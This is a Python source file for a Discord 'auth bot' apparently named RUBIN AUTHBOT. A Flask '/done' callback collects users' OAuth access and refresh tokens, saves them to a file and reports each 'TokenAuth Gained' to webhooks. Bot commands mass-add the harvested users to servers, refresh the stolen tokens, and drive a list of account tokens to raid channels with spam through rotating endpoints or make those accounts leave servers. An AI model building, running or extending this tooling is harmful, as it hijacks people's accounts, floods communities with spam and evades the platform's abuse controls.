import json

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

token = config['token']
secret = config['secret']
id = config['id']
redirect = config['redirect']
api_endpoint = config['api_endpoint']
usesrs = config['users']
logs = config['logs']
fuck_api = config['fuck_api']


import random
import discord
import os
import time
import flask
import requests
import json
import asyncio

from threading import Thread
from discord.ext import commands
from time import sleep
from flask import Flask, request
from discord.ui import Button, View
from discord import app_commands
from cogs.funcitons import *


prefix = '--'
client = commands.Bot(command_prefix = prefix, intents = discord.Intents.all())
app = Flask('web')

@client.event
async def on_connect():
    print(f'Connected : {client.user}')
    await client.tree.sync()

    

@client.event
async def on_message(message):
    await client.process_commands(message)
    #if message.channel.id == 1162764678481584279:
     #  channel_id = message.channel.id
      # for i in tokenlist:
        # url = random.choice(fuck_api)
       #  type_tokens(i,url,channel_id)
       

# -- BOT COMMANDS BASIC UI -- #

@client.tree.command(name='rubin')
async def help(interaction : discord.Interaction):
    button = Button(label='Local Oauth', url = 'https://discord.com/api/oauth2/authorize?client_id=1144827835152863412&redirect_uri=http%3A%2F%2F127.0.0.1%3A5000%2Fdone&response_type=code&scope=identify%20guilds.join')
    button1 = Button(label='Invite', url='https://discord.com/api/oauth2/authorize?client_id=1164520468179599494&permissions=8&scope=bot%20applications.commands')
    credit = Button(label = 'Coded by Rubin :D', disabled = True, style = discord.ButtonStyle.primary)
    view = View()
    view.add_item(button)
    view.add_item(button1)
    view.add_item(credit)
    emb = discord.Embed(description = f"**```{client.user.name}'s Commands : ```**\n**```- HELP\n- SOON\n- REFRESH\n- USERS\n- ADDUSERS\n- RAID\n- LEAVEAUTHS\n- LEAVETOKENS\n- SYNCAUTHS\n- LINKS\n- WHITELIST\n- ADMINONLY\n- SENDBUTTON\n- SETLOGS```**")
    await interaction.response.send_message(f"{interaction.user.mention}",embed=emb, view=view)



@client.tree.command(name='tokentoauths')
async def tokentoauths(interaction : discord.Interaction):
    if str(interaction.user.id) == "1161958898320822292":
       pass
    else:
       await interaction.response.send_message('u cant use')
       return
    embed = discord.Embed(description = f'Started..! check auth logs!')
    await interaction.response.send_message(embed=embed)
    convert_token_to_auth()



@client.tree.command(name='join')   
async def hmm(interaction: discord.Interaction, users: int):
    if str(interaction.user.id) in usesrs:
       pass
    else:
       await interaction.response.send_message('u cant use')
       return
    view = View()
    button = Button(label = 'RUBIN AUTHBOT', style= discord.ButtonStyle.secondary, disabled= True)
    console = discord.Embed(description=f'**```> - RUBIN ON TOP - <```**')
    view.add_item(button)
    await interaction.response.send_message(embed=console, view=view)

    tries = 0
    added = 0
    
    screen = discord.Embed(description=f'**```> - - S T A T U S . B X B Y - - <```**')
    screen_message = await interaction.followup.send(embed=screen, view=view)
    added_usernames = []  # Store added usernames
    
    with open('refreshed.txt', 'r') as file:
        lines = file.readlines()
        linz = len(lines)
        for line in lines:
            tries = tries + 1
            user_id, access_token, refresh_token = line.strip().split(',')
            
            if added >= users:
                await interaction.followup.send(f'{interaction.user.mention} Added Successfully !')
                return True
            
            success = add_member_to_guild(interaction.guild.id, user_id, access_token)
            if success:
                added += 1
                username = await fetch_username(access_token)
                added_usernames.append(username)
                if len(added_usernames) > 10:
                    added_usernames.pop(0)
                
                # Update the console screen embed
                console_description = f'**```\n'
                console_description += f'> - - S T A T U S . B X B Y - - <\n'
                console_description += '-' * 30 + '\n'
                console_description += f'TRIES : {tries} / {linz}\nADDED : {added}/{users}\n'
                console_description += '-' * 30 + '\n'
                for added_username in added_usernames:
                    console_description += f'[+] Joined : {added_username}\n'
                console_description += '```**'
                
                console_embed = discord.Embed(description=console_description)
                await screen_message.edit(embed=console_embed)

        embed2 = discord.Embed(description='**```DATABASE LIMITED !```**')
        await interaction.followup.send(embed=embed2)

async def fetch_username(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}'
    }
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    if response.status_code == 200:
        user_data = response.json()
        username = user_data['username']
        return username
    else:
        return "Unknown User"




def refresh_all():
  with open('refreshed.txt','w') as fm:
    fm.write('')
    fm.close()
  with open('database.txt','r') as db:
    for line in db:
      user_id, access_token, refresh_token = line.strip().split(',')
      refresh_tokenz(refresh_token, user_id)
  with open('refreshed.txt','r') as read:
    readd = read.read()
  with open('database.txt','w') as red:
    red.write(f'{readd}')
    red.close()


#-- FUNCTIONS --$

def read_tokens_from_file(file_name):
    tokenlist = []

    try:
        with open(file_name, 'r') as file:
            for line in file:
                token = line.strip()
                if token:
                    tokenlist.append(token)
    except FileNotFoundError:
        print(f"File '{file_name}' not found.")

    return tokenlist

tokenlist = read_tokens_from_file('tokens.txt')

@client.tree.command(name='leavetokens')
async def leave(interaction : discord.Interaction):
    if str(interaction.user.id) == "1161958898320822292":
       pass
    else:
       await interaction.response.send_message('u cant use')
       return
    await interaction.response.send_message('- Leaving all tokens !')
    id = interaction.guild.id
    url = f'https://discord.com/api/v10/users/@me/guilds/{id}'
    for i in tokenlist:
      headers = {
    'Authorization': f'{i}'
    }
      requests.delete(url, headers=headers)


@client.tree.command(name='raid')
async def raid(interaction : discord.Interaction, message:str):
    channel_id = interaction.channel.id
    if str(interaction.user.id) in usesrs:
       pass
    else:
       await interaction.response.send_message('u cant use')
       return
    await interaction.response.send_message('- Started! !')
    id = interaction.guild.id
    for i in tokenlist:
       url = random.choice(fuck_api)
       send_messages(i,url,channel_id,message)

@client.tree.command(name='type')
async def type(interaction : discord.Interaction):
    channel_id = interaction.channel.id
    if str(interaction.user.id) in usesrs:
       pass
    else:
       await interaction.response.send_message('u cant use')
       return
    await interaction.response.send_message('- Started! !')
    id = interaction.guild.id
    for i in tokenlist:
       url = random.choice(fuck_api)
       type_tokens(i,url,channel_id)


@client.tree.command(name='refresh')
async def refreshk(interaction : discord.Interaction):
    if str(interaction.user.id) == "1161958898320822292":
       pass
    else:
       await interaction.response.send_message('u cant use')
       return
    await interaction.response.send_message('STATTED TO REFRESH !')
    refresh_all()
    await interaction.followup.send('REFRESHED SUCCESSFULLY !')
   


@client.tree.command(name='users')
async def users(interaction: discord.Interaction):
   ab = usersz()
   await interaction.response.send_message(ab)



def add_member_to_guild(guild_id, user_id, access_token):
    data = {
        "access_token": access_token,
    }
    headers = {
        "Authorization": f"Bot {token}",
        'Content-Type': 'application/json'
    }
    try:
        #time.sleep(0.5)
        response = requests.put(f'{api_endpoint}/guilds/{guild_id}/members/{user_id}', headers=headers, json=data)
    except:
        print('Failed !')
    if response.status_code == 201:
       return True
    else:
       return False

def usersz():
    with open('database.txt', 'r') as file:
        lines = file.readlines()
        count = len(lines)
        file.close()
    return f'- Users : {count}'

@app.route('/done')
def authenticate():
  try:
    code = request.args.get('code')
    print("Code")
    data = {
        'client_id': id,
        'client_secret': secret,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': redirect,
    }
    hook_url = random.choice(logs)
    
    time.sleep(1)
    response = requests.post(f'{api_endpoint}/oauth2/token', data=data)
    details = response.json()
    print(details)
    access_token = details['access_token']
    refresh_token = details['refresh_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    time.sleep(1)
    response = requests.get(f'{api_endpoint}/users/@me', headers=headers)
    user_id = response.json()['id']
    data = {
       "content": f"**New TokenAuth Gained !! GG!\nUser_ID : {user_id}**"
    }
    requests.post(hook_url,json=data)
    with open('database.txt', 'a') as file:
        file.write(f'{user_id},{access_token},{refresh_token}\n')
        file.flush()
        file.close()
        print('- new token gained !')
    
    return "success"
  except:
    return 'error'
  
def refresh_tokenz(refresh_token,user_id):
  print(f'- REFRESHING : {refresh_token}')
  data = {
      'client_id': id,
      'client_secret': secret,
      'grant_type': 'refresh_token',
      'refresh_token': refresh_token
  }    
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  #time.sleep(0.5)
  response = requests.post(f'{api_endpoint}/oauth2/token', data=data, headers=headers)
  if response.status_code in (201,200,203,204):
    print('Refreshed Successfully!')
    details = response.json()
    updated_token = details['access_token']
    updated_refresh = details['refresh_token']
    with open('refreshed.txt','a') as db:
      db.write(f'{user_id},{updated_token},{updated_refresh}' + '\n')
      db.close()
  else:
    print('Failed to refresh!')

#--flask--#

@app.route('/')
def index():
   return "xd"

def run():
  app.run()
  
def keep_alive(): 
  t = Thread(target=run)
  t.start()

keep_alive()

client.run(token, reconnect = True)